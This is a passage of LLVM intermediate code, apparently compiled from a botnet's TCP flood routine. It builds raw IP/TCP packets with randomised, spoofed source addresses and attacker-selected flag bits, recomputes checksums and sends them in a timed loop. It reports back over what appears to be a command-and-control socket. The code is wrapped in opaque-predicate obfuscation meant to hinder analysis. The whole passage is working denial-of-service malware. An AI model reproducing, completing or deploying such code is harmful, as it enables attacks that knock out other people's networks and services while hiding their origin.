  %122 = load i32, i32* @x.89
  %123 = load i32, i32* @y.90
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %152

; <label>:130:                                    ; preds = %originalBBpart28
  %131 = load i32, i32* @x.89
  %132 = load i32, i32* @y.90
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %130
  %139 = load i32, i32* %19, align 4
  %140 = sub nsw i32 32, %139
  %141 = shl i32 1, %140
  %142 = sub nsw i32 %141, 1
  %143 = xor i32 %142, -1
  store i32 %143, i32* %27, align 4
  %144 = load i32, i32* @x.89
  %145 = load i32, i32* @y.90
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart248, label %originalBB14alteredBB

originalBBpart248:                                ; preds = %originalBB14
  br label %152

; <label>:152:                                    ; preds = %originalBBpart248, %originalBBpart212
  %153 = load i32, i32* %21, align 4
  %154 = sext i32 %153 to i64
  %155 = add i64 40, %154
  %156 = call i8* @llvm.stacksave()
  store i8* %156, i8** %28, align 8
  %157 = alloca i8, i64 %155, align 16
  %158 = bitcast i8* %157 to %struct.iphdr*
  store %struct.iphdr* %158, %struct.iphdr** %29, align 8
  %159 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %160 = bitcast %struct.iphdr* %159 to i8*
  %161 = getelementptr i8, i8* %160, i64 20
  %162 = bitcast i8* %161 to %struct.tcphdr*
  store %struct.tcphdr* %162, %struct.tcphdr** %30, align 8
  %163 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  %166 = load i32, i32* %165, align 4
  %167 = load i32, i32* %27, align 4
  %168 = call i32 @GetRandomIP(i32 %167)
  %169 = call i32 @htonl(i32 %168) #13
  %170 = load i32, i32* %21, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 20, %171
  %173 = trunc i64 %172 to i32
  call void @makeIPPacket(%struct.iphdr* %163, i32 %166, i32 %169, i8 zeroext 6, i32 %173)
  %174 = call i32 @rand_cmwc()
  %175 = trunc i32 %174 to i16
  %176 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon.0* %177 to %struct.anon.1*
  %179 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %178, i32 0, i32 0
  store i16 %175, i16* %179, align 4
  %180 = call i32 @rand_cmwc()
  %181 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %182 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %181, i32 0, i32 0
  %183 = bitcast %union.anon.0* %182 to %struct.anon.1*
  %184 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %183, i32 0, i32 2
  store i32 %180, i32* %184, align 4
  %185 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %186 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %185, i32 0, i32 0
  %187 = bitcast %union.anon.0* %186 to %struct.anon.1*
  %188 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %187, i32 0, i32 3
  store i32 0, i32* %188, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.0* %190 to %struct.anon.1*
  %192 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %191, i32 0, i32 4
  %193 = load i16, i16* %192, align 4
  %194 = and i16 %193, -241
  %195 = or i16 %194, 80
  store i16 %195, i16* %192, align 4
  %196 = load i8*, i8** %20, align 8
  %197 = call i32 @strcmp(i8* %196, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.182, i32 0, i32 0)) #10
  %198 = icmp ne i32 %197, 0
  br i1 %198, label %251, label %199

; <label>:199:                                    ; preds = %152
  %200 = load i32, i32* @x.89
  %201 = load i32, i32* @y.90
  %202 = sub i32 %200, 1
  %203 = mul i32 %200, %202
  %204 = urem i32 %203, 2
  %205 = icmp eq i32 %204, 0
  %206 = icmp slt i32 %201, 10
  %207 = or i1 %205, %206
  br i1 %207, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %199
  %208 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.0* %209 to %struct.anon.1*
  %211 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %210, i32 0, i32 4
  %212 = load i16, i16* %211, align 4
  %213 = and i16 %212, -513
  %214 = or i16 %213, 512
  store i16 %214, i16* %211, align 4
  %215 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %216 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon.0* %216 to %struct.anon.1*
  %218 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %219, -1025
  %221 = or i16 %220, 1024
  store i16 %221, i16* %218, align 4
  %222 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  %224 = bitcast %union.anon.0* %223 to %struct.anon.1*
  %225 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %224, i32 0, i32 4
  %226 = load i16, i16* %225, align 4
  %227 = and i16 %226, -257
  %228 = or i16 %227, 256
  store i16 %228, i16* %225, align 4
  %229 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 0
  %231 = bitcast %union.anon.0* %230 to %struct.anon.1*
  %232 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %231, i32 0, i32 4
  %233 = load i16, i16* %232, align 4
  %234 = and i16 %233, -4097
  %235 = or i16 %234, 4096
  store i16 %235, i16* %232, align 4
  %236 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %237 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %236, i32 0, i32 0
  %238 = bitcast %union.anon.0* %237 to %struct.anon.1*
  %239 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %240, -2049
  %242 = or i16 %241, 2048
  store i16 %242, i16* %239, align 4
  %243 = load i32, i32* @x.89
  %244 = load i32, i32* @y.90
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBBpart2136, label %originalBB50alteredBB

originalBBpart2136:                               ; preds = %originalBB50
  br label %408

; <label>:251:                                    ; preds = %152
  %252 = load i8*, i8** %20, align 8
  %253 = call i8* @strtok(i8* %252, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %253, i8** %31, align 8
  br label %254

; <label>:254:                                    ; preds = %originalBBpart2170, %251
  %255 = load i8*, i8** %31, align 8
  %256 = icmp ne i8* %255, null
  br i1 %256, label %257, label %407

; <label>:257:                                    ; preds = %254
  %258 = load i8*, i8** %31, align 8
  %259 = call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i32 0, i32 0)) #10
  %260 = icmp ne i32 %259, 0
  br i1 %260, label %269, label %261

; <label>:261:                                    ; preds = %257
  %262 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %263 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %262, i32 0, i32 0
  %264 = bitcast %union.anon.0* %263 to %struct.anon.1*
  %265 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %264, i32 0, i32 4
  %266 = load i16, i16* %265, align 4
  %267 = and i16 %266, -513
  %268 = or i16 %267, 512
  store i16 %268, i16* %265, align 4
  br label %389

; <label>:269:                                    ; preds = %257
  %270 = load i8*, i8** %31, align 8
  %271 = call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i32 0, i32 0)) #10
  %272 = icmp ne i32 %271, 0
  br i1 %272, label %297, label %273

; <label>:273:                                    ; preds = %269
  %274 = load i32, i32* @x.89
  %275 = load i32, i32* @y.90
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %273
  %282 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 0
  %284 = bitcast %union.anon.0* %283 to %struct.anon.1*
  %285 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %284, i32 0, i32 4
  %286 = load i16, i16* %285, align 4
  %287 = and i16 %286, -1025
  %288 = or i16 %287, 1024
  store i16 %288, i16* %285, align 4
  %289 = load i32, i32* @x.89
  %290 = load i32, i32* @y.90
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart2154, label %originalBB138alteredBB

originalBBpart2154:                               ; preds = %originalBB138
  br label %388

; <label>:297:                                    ; preds = %269
  %298 = load i8*, i8** %31, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.186, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  br i1 %300, label %309, label %301

; <label>:301:                                    ; preds = %297
  %302 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon.0* %303 to %struct.anon.1*
  %305 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %304, i32 0, i32 4
  %306 = load i16, i16* %305, align 4
  %307 = and i16 %306, -257
  %308 = or i16 %307, 256
  store i16 %308, i16* %305, align 4
  br label %371

; <label>:309:                                    ; preds = %297
  %310 = load i8*, i8** %31, align 8
  %311 = call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.187, i32 0, i32 0)) #10
  %312 = icmp ne i32 %311, 0
  br i1 %312, label %321, label %313

; <label>:313:                                    ; preds = %309
  %314 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i32 0, i32 0
  %316 = bitcast %union.anon.0* %315 to %struct.anon.1*
  %317 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %316, i32 0, i32 4
  %318 = load i16, i16* %317, align 4
  %319 = and i16 %318, -4097
  %320 = or i16 %319, 4096
  store i16 %320, i16* %317, align 4
  br label %354

; <label>:321:                                    ; preds = %309
  %322 = load i32, i32* @x.89
  %323 = load i32, i32* @y.90
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %321
  %330 = load i8*, i8** %31, align 8
  %331 = call i32 @strcmp(i8* %330, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i32 0, i32 0)) #10
  %332 = icmp ne i32 %331, 0
  %333 = load i32, i32* @x.89
  %334 = load i32, i32* @y.90
  %335 = sub i32 %333, 1
  %336 = mul i32 %333, %335
  %337 = urem i32 %336, 2
  %338 = icmp eq i32 %337, 0
  %339 = icmp slt i32 %334, 10
  %340 = or i1 %338, %339
  br i1 %340, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br i1 %332, label %349, label %341

; <label>:341:                                    ; preds = %originalBBpart2158
  %342 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %343 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon.0* %343 to %struct.anon.1*
  %345 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %344, i32 0, i32 4
  %346 = load i16, i16* %345, align 4
  %347 = and i16 %346, -2049
  %348 = or i16 %347, 2048
  store i16 %348, i16* %345, align 4
  br label %353

; <label>:349:                                    ; preds = %originalBBpart2158
  %350 = load i32, i32* @mainCommSock, align 4
  %351 = load i8*, i8** %31, align 8
  %352 = call i32 (i32, i8*, ...) @sockprintf(i32 %350, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.189, i32 0, i32 0), i8* %351)
  br label %353

; <label>:353:                                    ; preds = %349, %341
  br label %354

; <label>:354:                                    ; preds = %353, %313
  %355 = load i32, i32* @x.89
  %356 = load i32, i32* @y.90
  %357 = sub i32 %355, 1
  %358 = mul i32 %355, %357
  %359 = urem i32 %358, 2
  %360 = icmp eq i32 %359, 0
  %361 = icmp slt i32 %356, 10
  %362 = or i1 %360, %361
  br i1 %362, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %354
  %363 = load i32, i32* @x.89
  %364 = load i32, i32* @y.90
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br label %371

; <label>:371:                                    ; preds = %originalBBpart2162, %301
  %372 = load i32, i32* @x.89
  %373 = load i32, i32* @y.90
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %371
  %380 = load i32, i32* @x.89
  %381 = load i32, i32* @y.90
  %382 = sub i32 %380, 1
  %383 = mul i32 %380, %382
  %384 = urem i32 %383, 2
  %385 = icmp eq i32 %384, 0
  %386 = icmp slt i32 %381, 10
  %387 = or i1 %385, %386
  br i1 %387, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br label %388

; <label>:388:                                    ; preds = %originalBBpart2166, %originalBBpart2154
  br label %389

; <label>:389:                                    ; preds = %388, %261
  %390 = load i32, i32* @x.89
  %391 = load i32, i32* @y.90
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
  %394 = urem i32 %393, 2
  %395 = icmp eq i32 %394, 0
  %396 = icmp slt i32 %391, 10
  %397 = or i1 %395, %396
  br i1 %397, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %389
  %398 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0)) #2
  store i8* %398, i8** %31, align 8
  %399 = load i32, i32* @x.89
  %400 = load i32, i32* @y.90
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br label %254

; <label>:407:                                    ; preds = %254
  br label %408

; <label>:408:                                    ; preds = %407, %originalBBpart2136
  %409 = call i32 @rand_cmwc()
  %410 = trunc i32 %409 to i16
  %411 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %412 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %411, i32 0, i32 0
  %413 = bitcast %union.anon.0* %412 to %struct.anon.1*
  %414 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %413, i32 0, i32 5
  store i16 %410, i16* %414, align 2
  %415 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 0
  %417 = bitcast %union.anon.0* %416 to %struct.anon.1*
  %418 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %417, i32 0, i32 6
  store i16 0, i16* %418, align 4
  %419 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon.0* %420 to %struct.anon.1*
  %422 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %421, i32 0, i32 7
  store i16 0, i16* %422, align 2
  %423 = load i32, i32* %17, align 4
  %424 = icmp eq i32 %423, 0
  br i1 %424, label %425, label %427

; <label>:425:                                    ; preds = %408
  %426 = call i32 @rand_cmwc()
  br label %432

; <label>:427:                                    ; preds = %408
  %428 = load i32, i32* %17, align 4
  %429 = trunc i32 %428 to i16
  %430 = call zeroext i16 @htons(i16 zeroext %429) #13
  %431 = zext i16 %430 to i32
  br label %432

; <label>:432:                                    ; preds = %427, %425
  %433 = phi i32 [ %426, %425 ], [ %431, %427 ]
  %434 = trunc i32 %433 to i16
  %435 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon.0* %436 to %struct.anon.1*
  %438 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %437, i32 0, i32 1
  store i16 %434, i16* %438, align 2
  %439 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %440 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %441 = call zeroext i16 @tcpcsum(%struct.iphdr* %439, %struct.tcphdr* %440)
  %442 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon.0* %443 to %struct.anon.1*
  %445 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %444, i32 0, i32 6
  store i16 %441, i16* %445, align 4
  %446 = bitcast i8* %157 to i16*
  %447 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = zext i16 %449 to i32
  %451 = call zeroext i16 @csum(i16* %446, i32 %450)
  %452 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 7
  store i16 %451, i16* %453, align 2
  %454 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %455 = load i32, i32* %18, align 4
  %456 = add nsw i32 %454, %455
  store i32 %456, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %457

; <label>:457:                                    ; preds = %574, %573, %432
  %458 = load i32, i32* @x.89
  %459 = load i32, i32* @y.90
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %457
  %466 = load i32, i32* @x.89
  %467 = load i32, i32* @y.90
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br label %474

; <label>:474:                                    ; preds = %originalBBpart2174
  %475 = load i32, i32* @x.89
  %476 = load i32, i32* @y.90
  %477 = sub i32 %475, 1
  %478 = mul i32 %475, %477
  %479 = urem i32 %478, 2
  %480 = icmp eq i32 %479, 0
  %481 = icmp slt i32 %476, 10
  %482 = or i1 %480, %481
  br i1 %482, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %474
  %483 = load i32, i32* %25, align 4
  %484 = bitcast %struct.sockaddr_in* %24 to %struct.sockaddr*
  %485 = call i64 @sendto(i32 %483, i8* %157, i64 %155, i32 0, %struct.sockaddr* %484, i32 16)
  %486 = load i32, i32* %27, align 4
  %487 = call i32 @GetRandomIP(i32 %486)
  %488 = call i32 @htonl(i32 %487) #13
  %489 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 8
  store i32 %488, i32* %490, align 4
  %491 = call i32 @rand_cmwc()
  %492 = trunc i32 %491 to i16
  %493 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %494 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %493, i32 0, i32 3
  store i16 %492, i16* %494, align 4
  %495 = call i32 @rand_cmwc()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = bitcast %union.anon.0* %497 to %struct.anon.1*
  %499 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %498, i32 0, i32 2
  store i32 %495, i32* %499, align 4
  %500 = call i32 @rand_cmwc()
  %501 = trunc i32 %500 to i16
  %502 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 0
  %504 = bitcast %union.anon.0* %503 to %struct.anon.1*
  %505 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %504, i32 0, i32 0
  store i16 %501, i16* %505, align 4
  %506 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = bitcast %union.anon.0* %507 to %struct.anon.1*
  %509 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %508, i32 0, i32 6
  store i16 0, i16* %509, align 4
  %510 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %511 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %512 = call zeroext i16 @tcpcsum(%struct.iphdr* %510, %struct.tcphdr* %511)
  %513 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i32 0, i32 0
  %515 = bitcast %union.anon.0* %514 to %struct.anon.1*
  %516 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %515, i32 0, i32 6
  store i16 %512, i16* %516, align 4
  %517 = bitcast i8* %157 to i16*
  %518 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %519 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %518, i32 0, i32 2
  %520 = load i16, i16* %519, align 2
  %521 = zext i16 %520 to i32
  %522 = call zeroext i16 @csum(i16* %517, i32 %521)
  %523 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 7
  store i16 %522, i16* %524, align 2
  %525 = load i32, i32* %33, align 4
  %526 = load i32, i32* %23, align 4
  %527 = icmp eq i32 %525, %526
  %528 = load i32, i32* @x.89
  %529 = load i32, i32* @y.90
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br i1 %527, label %536, label %574

; <label>:536:                                    ; preds = %originalBBpart2178
  %537 = load i32, i32* @x.89
  %538 = load i32, i32* @y.90
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %536
  %545 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %546 = load i32, i32* %32, align 4
  %547 = icmp sgt i32 %545, %546
  %548 = load i32, i32* @x.89
  %549 = load i32, i32* @y.90
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br i1 %547, label %556, label %573

; <label>:556:                                    ; preds = %originalBBpart2182
  %557 = load i32, i32* @x.89
  %558 = load i32, i32* @y.90
  %559 = sub i32 %557, 1
  %560 = mul i32 %557, %559
  %561 = urem i32 %560, 2
  %562 = icmp eq i32 %561, 0
  %563 = icmp slt i32 %558, 10
  %564 = or i1 %562, %563
  br i1 %564, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %556
  %565 = load i32, i32* @x.89
  %566 = load i32, i32* @y.90
  %567 = sub i32 %565, 1
  %568 = mul i32 %565, %567
  %569 = urem i32 %568, 2
  %570 = icmp eq i32 %569, 0
  %571 = icmp slt i32 %566, 10
  %572 = or i1 %570, %571
  br i1 %572, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %577

; <label>:573:                                    ; preds = %originalBBpart2182
  store i32 0, i32* %33, align 4
  br label %457

; <label>:574:                                    ; preds = %originalBBpart2178
  %575 = load i32, i32* %33, align 4
  %576 = add i32 %575, 1
  store i32 %576, i32* %33, align 4
  br label %457

; <label>:577:                                    ; preds = %originalBBpart2186
  %578 = load i32, i32* @x.89
  %579 = load i32, i32* @y.90
  %580 = sub i32 %578, 1
  %581 = mul i32 %578, %580
  %582 = urem i32 %581, 2
  %583 = icmp eq i32 %582, 0
  %584 = icmp slt i32 %579, 10
  %585 = or i1 %583, %584
  br i1 %585, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %577
  %586 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %586)
  %587 = load i32, i32* @x.89
  %588 = load i32, i32* @y.90
  %589 = sub i32 %587, 1
  %590 = mul i32 %587, %589
  %591 = urem i32 %590, 2
  %592 = icmp eq i32 %591, 0
  %593 = icmp slt i32 %588, 10
  %594 = or i1 %592, %593
  br i1 %594, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br label %595

; <label>:595:                                    ; preds = %originalBBpart2190, %91, %83, %originalBBpart24
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %596 = alloca i8*, align 8
  %597 = alloca i32, align 4
  %598 = alloca i32, align 4
  %599 = alloca i32, align 4
  %600 = alloca i8*, align 8
  %601 = alloca i32, align 4
  %602 = alloca i32, align 4
  %603 = alloca i32, align 4
  %604 = alloca %struct.sockaddr_in, align 4
  %605 = alloca i32, align 4
  %606 = alloca i32, align 4
  %607 = alloca i32, align 4
  %608 = alloca i8*, align 8
  %609 = alloca %struct.iphdr*, align 8
  %610 = alloca %struct.tcphdr*, align 8
  %611 = alloca i8*, align 8
  %612 = alloca i32, align 4
  %613 = alloca i32, align 4
  store i8* %0, i8** %596, align 8
  store i32 %1, i32* %597, align 4
  store i32 %2, i32* %598, align 4
  store i32 %3, i32* %599, align 4
  store i8* %4, i8** %600, align 8
  store i32 %5, i32* %601, align 4
  store i32 %6, i32* %602, align 4
  %614 = load i32, i32* %602, align 4
  store i32 %614, i32* %603, align 4
  %615 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %604, i32 0, i32 0
  store i16 2, i16* %615, align 4
  %616 = load i32, i32* %597, align 4
  %617 = icmp eq i32 %616, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %618 = load i32, i32* %19, align 4
  %619 = icmp eq i32 %618, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  store i32 0, i32* %27, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %130
  %620 = load i32, i32* %19, align 4
  %_ = shl i32 32, %620
  %621 = sub nsw i32 32, %620
  %_15 = sub i32 0, 1
  %gen = add i32 %_15, %621
  %_16 = sub i32 1, %621
  %gen17 = mul i32 %_16, %621
  %_18 = shl i32 1, %621
